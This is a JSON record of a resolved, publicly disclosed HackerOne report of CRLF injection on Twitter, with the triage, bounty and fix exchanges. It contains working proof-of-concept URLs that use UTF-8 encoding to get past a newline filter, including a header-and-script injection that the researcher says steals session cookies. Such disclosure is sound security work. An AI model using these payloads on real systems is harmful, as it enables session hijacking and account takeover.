{"id":52042,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MjA0Mg==","url":"https://hackerone.com/reports/52042","title":"HTTP Response Splitting (CRLF injection) in report_story","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-03-15T07:49:31.208Z","submitted_at":"2015-03-15T07:49:31.208Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"filedescriptor","url":"/filedescriptor","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-04-21T17:59:23.057Z","bug_reporter_agreed_on_going_public_at":"2015-04-21T17:59:22.520Z","team_member_agreed_on_going_public_at":"2015-04-13T19:15:22.382Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\r\n\r\nI would like to report a HTTP Response Splitting vulnerability in https://twitter.com/i/safety/report_story that allows attackers to inject arbitrary headers and contents in the response. \r\n\r\n## PoC:\r\nhttps://twitter.com/i/safety/report_story?next_view=report_story_start\u0026source=reporttweet\u0026reported_user_id=1\u0026reporter_user_id=1\u0026is_media=true\u0026is_promoted=true\u0026reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookie:%20test\r\n\r\n## Details:\r\nThe page will set cookie for the parameter *reported_tweet_id*. However, it doesn't validate strictly if it is a number. Although there is a protection against CRLF injection by detecting the presence of any *NewLine* character (0x0a), it can be bypassed with characters encoded in UTF-8 as the the page will try to convert them back to the original Unicode form and extract the last byte. For example, *%E5%98%8A* =\u003e *U+560A* =\u003e *0A*.","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI would like to report a HTTP Response Splitting vulnerability in \u003ca title=\"https://twitter.com/i/safety/report_story\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fi%2Fsafety%2Freport_story\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/i/safety/report_story\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that allows attackers to inject arbitrary headers and contents in the response. \u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePoC:\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"https://twitter.com/i/safety/report_story?next_view=report_story_start\u0026amp;source=reporttweet\u0026amp;reported_user_id=1\u0026amp;reporter_user_id=1\u0026amp;is_media=true\u0026amp;is_promoted=true\u0026amp;reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookie:%20test\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Fi%2Fsafety%2Freport_story%3Fnext_view%3Dreport_story_start%26source%3Dreporttweet%26reported_user_id%3D1%26reporter_user_id%3D1%26is_media%3Dtrue%26is_promoted%3Dtrue%26reported_tweet_id%3D%25E5%2598%258A%25E5%2598%258DSet-Cookie%3A%2520test\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/i/safety/report_story?next_view=report_story_start\u0026amp;source=reporttweet\u0026amp;reported_user_id=1\u0026amp;reporter_user_id=1\u0026amp;is_media=true\u0026amp;is_promoted=true\u0026amp;reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookie:%20test\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"details\"\u003eDetails:\u003c/h2\u003e\n\n\u003cp\u003eThe page will set cookie for the parameter \u003cem\u003ereported_tweet_id\u003c/em\u003e. However, it doesn\u0026#39;t validate strictly if it is a number. Although there is a protection against CRLF injection by detecting the presence of any \u003cem\u003eNewLine\u003c/em\u003e character (0x0a), it can be bypassed with characters encoded in UTF-8 as the the page will try to convert them back to the original Unicode form and extract the last byte. For example, \u003cem\u003e%E5%98%8A\u003c/em\u003e =\u0026gt; \u003cem\u003eU+560A\u003c/em\u003e =\u0026gt; \u003cem\u003e0A\u003c/em\u003e.\u003c/p\u003e\n","bounty_amount":"3500.0","formatted_bounty":"$3,500","original_report_id":null,"original_report_url":null,"attachments":[{"id":32110,"file_name":"twitter_crlf.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/032/110/1273cf910bf42fb1b2819916fa0749685ae2db65/twitter_crlf.png?response-content-disposition=attachment%3B%20filename%3D%22twitter_crlf.png%22%3B%20filename%2A%3DUTF-8%27%27twitter_crlf.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061421Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=c052f2ee32a3fbf1d621d082fdcf483e8b0f8e7edb2343b7964b3c63d0ff2548","file_size":85869,"type":"image/png"}],"allow_singular_disclosure_at":"2015-05-13T19:15:40.320Z","allow_singular_disclosure_after":-177677921.55129424,"singular_disclosure_allowed":true,"vote_count":38,"voters":["dejavuln","anovg","ankitsingh","brodie_codie","xsam","eveeez","pinch","r3y","ibram","realtess","and 28 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":356040,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-16T18:22:29.296Z","updated_at":"2015-03-16T18:22:29.296Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":357482,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This issue can be extended to enable the attacker to steal certain httpOnly protected cookies, namely *\\_twitter_sess* and *auth_token*, so that the attacker can take over the victim's session.\n\nPoC (works on Firefox): [https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE](https://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%29%E5%98%BE)\n\n","markdown_message":"\u003cp\u003eThis issue can be extended to enable the attacker to steal certain httpOnly protected cookies, namely \u003cem\u003e_twitter_sess\u003c/em\u003e and \u003cem\u003eauth_token\u003c/em\u003e, so that the attacker can take over the victim\u0026#39;s session.\u003c/p\u003e\n\n\u003cp\u003ePoC (works on Firefox): \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2Flogin%3Fredirect_after_login%3Dhttps%3A%2F%2Ftwitter.com%3A21%2F%25E5%2598%258A%25E5%2598%258Dcontent-type%3Atext%2Fhtml%25E5%2598%258A%25E5%2598%258Dlocation%3A%25E5%2598%258A%25E5%2598%258D%25E5%2598%258A%25E5%2598%258D%25E5%2598%25BCsvg%2Fonload%3Dalert%2528innerHTML%2529%25E5%2598%25BE\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-18T10:52:00.575Z","updated_at":"2015-03-18T11:02:18.550Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":357504,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is a video demonstration to depict the above issue:\nhttps://vimeo.com/122522782 (Password: canvas)","markdown_message":"\u003cp\u003eHere is a video demonstration to depict the above issue:\u003cbr\u003e\n\u003ca title=\"https://vimeo.com/122522782\" href=\"/redirect?url=https%3A%2F%2Fvimeo.com%2F122522782\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://vimeo.com/122522782\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (Password: canvas)\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-18T11:22:46.983Z","updated_at":"2015-03-18T11:22:46.983Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":358951,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, thank you for the additional information. We are working to resolve this as quickly as possible. Thank you for your patience.","markdown_message":"\u003cp\u003eHi, thank you for the additional information. We are working to resolve this as quickly as possible. Thank you for your patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-19T21:29:05.458Z","updated_at":"2015-03-19T21:29:05.458Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":359837,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.","markdown_message":"\u003cp\u003eThanks again. As mentioned we’ll keep you updated as we investigate further. As a reminder, please remember to keep the details of this report private until we have fully investigated and addressed the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-21T03:43:31.239Z","updated_at":"2015-03-21T03:43:31.239Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"3500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"filedescriptor","url":"/filedescriptor"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":364983,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-27T22:32:41.461Z","updated_at":"2015-03-27T22:32:41.461Z","actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"filedescriptor","url":"/filedescriptor"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":365124,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can confirm this is fixed, thanks!\nBy the way, may I know the root cause of this issue? I wonder if this is Twitter specific or  framework related.","markdown_message":"\u003cp\u003eI can confirm this is fixed, thanks!\u003cbr\u003e\nBy the way, may I know the root cause of this issue? I wonder if this is Twitter specific or  framework related.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-03-28T06:32:12.667Z","updated_at":"2015-03-28T06:33:29.197Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":379085,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi, thank you for reporting this issue.\n\nUnfortunately, we cannot provide information about the cause of the vulnerability.\n\nWe are requesting public disclosure of this bug to encourage more reports of this quality. Thanks again!","markdown_message":"\u003cp\u003eHi, thank you for reporting this issue.\u003c/p\u003e\n\n\u003cp\u003eUnfortunately, we cannot provide information about the cause of the vulnerability.\u003c/p\u003e\n\n\u003cp\u003eWe are requesting public disclosure of this bug to encourage more reports of this quality. Thanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-04-13T19:15:22.497Z","updated_at":"2015-04-13T19:15:22.497Z","first_to_agree":true,"actor":{"username":"jcollins","cleared":false,"url":"/jcollins","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/114/d24b9beb256b432cb38b64b8e3620e03aef9332a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":386573,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-21T17:59:22.621Z","updated_at":"2015-04-21T17:59:22.621Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":386574,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-04-21T17:59:23.087Z","updated_at":"2015-04-21T17:59:23.087Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":69,"category":"researcher","content":"Write-up: https://blog.innerht.ml/twitter-crlf-injection/","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eWrite-up: \u003ca title=\"https://blog.innerht.ml/twitter-crlf-injection/\" href=\"/redirect?url=https%3A%2F%2Fblog.innerht.ml%2Ftwitter-crlf-injection%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://blog.innerht.ml/twitter-crlf-injection/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n"}]}